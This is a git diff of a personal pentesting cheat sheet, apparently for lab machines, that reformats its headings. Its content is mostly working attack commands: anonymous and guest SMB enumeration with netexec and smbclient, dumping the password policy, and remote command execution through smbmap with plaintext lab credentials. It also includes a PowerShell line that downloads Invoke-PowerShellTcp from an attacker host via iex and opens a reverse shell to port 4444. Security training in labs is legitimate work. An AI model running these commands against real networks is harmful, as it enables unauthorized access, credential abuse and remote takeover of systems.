@@ -1,14 +1,23 @@
 ### Index
 
-1.  Links
-2.  Samba
-3.  CURL
-4. Ways to get the shell 
-5. PowerShell and AD
-6. PowerView and SharpView //Need to add as you go
-7. BloodHound //Need to add as you go
-8. SharpHound //Need to add as you go
-
+1.  [Links](#Links)
+2.  [Samba](#Samba)
+	2.1  [Trying to List smb share using Guest account](#Trying%20to%20List%20smb%20share%20using%20Guest%20account)
+	2.2  [Dumbing Password Policy through SMB Share](#Dumbing%20Password%20Policy%20through%20SMB%20Share)
+	2.3  [Spidering SMB shares](#Spidering%20SMB%20shares)
+	2.4  [Listing the SMB Shares without password using smbclient](#Listing%20the%20SMB%20Shares%20without%20password%20using%20smbclient)
+	2.5  [Listing SMB Share using Password or NTLM hash](#Listing%20SMB%20Share%20using%20Password%20or%20NTLM%20hash)
+	2.6  [Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share](#Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share)
+	2.7  [Getting the file from SMB Share without password anonymously](#Getting%20the%20file%20from%20SMB%20Share%20without%20password%20anonymously)
+	2.8  [Execute Command using smbmap](#Execute%20Command%20using%20smbmap)
+	2.9  [smbmap - Non Recursive Path Listing](#smbmap%20-%20Non%20Recursive%20Path%20Listing)
+	2.10 [Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.](#Get%20a%20Reverse%20shell%20using%20`smbmap`.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.)
+3.  [Nmap](#Nmap)
+4.  [CURL](#CURL)
+5. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
+	5.1  [RCE to Shell](#RCE%20to%20Shell)
+	5.2  [Getting Shell When you have password](#Getting%20Shell%20When%20you%20have%20password)
+6.  [PowerShell & Active Directory](#PowerShell%20&%20Active%20Directory)
 ### Links
 
 [LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
@@ -27,36 +36,36 @@
 
 ### Samba
 
-Trying to List smb share using Guest account \
+###### Trying to List smb share using Guest account 
 ```
 netexec smb 10.10.10.111 -u Guest -p "" --shares 
 netexec --verbose smb 10.10.10.111 -u Guest -p "" --shares
 ```
 
-Dumbing Password Policy through SMB Share
+###### Dumbing Password Policy through SMB Share
 ```
 netexec --verbose smb 10.10.10.111 -u Guest -p "" --pass-pol
 ```
 
-Spidering SMB shares
+###### Spidering SMB shares
 
 ```
 netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
 ```
 
-Listing the SMB Shares without password using smbclient
+###### Listing the SMB Shares without password using smbclient
 
 ```
 $ smbclient --no-pass -L 10.10.10.134
 $ smbclient --no-pass -L //<IP> # Null user
 ```
 
-Listing SMB Share using Password or NTLM hash
+###### Listing SMB Share using Password or NTLM hash
 ```
 $ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
 ```
 
-Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share
+###### Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share
 ```
 # smbclient //10.10.11.174/support-tools            
 Password for [WORKGROUP\root]:
@@ -66,7 +75,7 @@ smb: \> dir
   7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:1
 ```
 
-Getting the file from SMB Share without password anonymously 
+###### Getting the file from SMB Share without password anonymously 
 ```
 ──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
 └─# smbclient //10.10.11.174/support-tools -c 'get putty.exe' 
@@ -78,17 +87,18 @@ getting file \putty.exe of size 1273576 as putty.exe (1294.2 KiloBytes/sec) (ave
 putty.exe
 ```
 
-Command Execution using smbmap: The `-d` switch can be avoided. 
+###### Execute Command using smbmap
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
+	# The `-d` switch can be ignored. 
 ```
 
-smbmap - Non Recursive Path Listing
+###### smbmap - Non Recursive Path Listing
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith/HQK Reporting' -H 10.10.10.178
 ```
 
-Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.
+###### Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
 ```
